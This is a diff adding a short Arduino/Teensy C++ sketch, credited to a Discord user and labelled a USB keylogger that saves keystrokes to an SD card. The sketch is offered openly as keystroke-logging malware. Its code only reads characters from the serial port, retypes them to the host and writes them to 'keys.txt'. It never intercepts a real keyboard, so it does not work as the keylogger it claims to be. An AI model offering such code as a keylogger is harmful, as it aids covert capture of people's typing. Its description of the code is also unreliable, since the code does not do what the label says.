@@ -1,0 +1,32 @@
+Made with C++
+USB Made Keylogger using Arduino or Teensy, By .Pixellox on discord
+---------------------------------------------
+#include <Keyboard.h>
+#include <SD.h>
+
+const int chipSelect = 10; // choose an available pin for SD card chip select
+
+File logfile;
+
+void setup() {
+  // Initialize the USB communication
+  Keyboard.begin();
+
+  // Initialize the SD card
+  if (SD.begin(chipSelect)) {
+    logfile = SD.open("keys.txt", FILE_WRITE); // Open or create a file named "keys.txt" for writing
+  }
+}
+
+void loop() {
+  // Continuously check for key presses
+  if (Serial.available() > 0) {
+    char key = Serial.read();
+    Keyboard.write(key); // Write the key to the computer
+
+    // Save the key to the SD card file
+    if (logfile) {
+      logfile.print(key);
+    }
+  }
+}
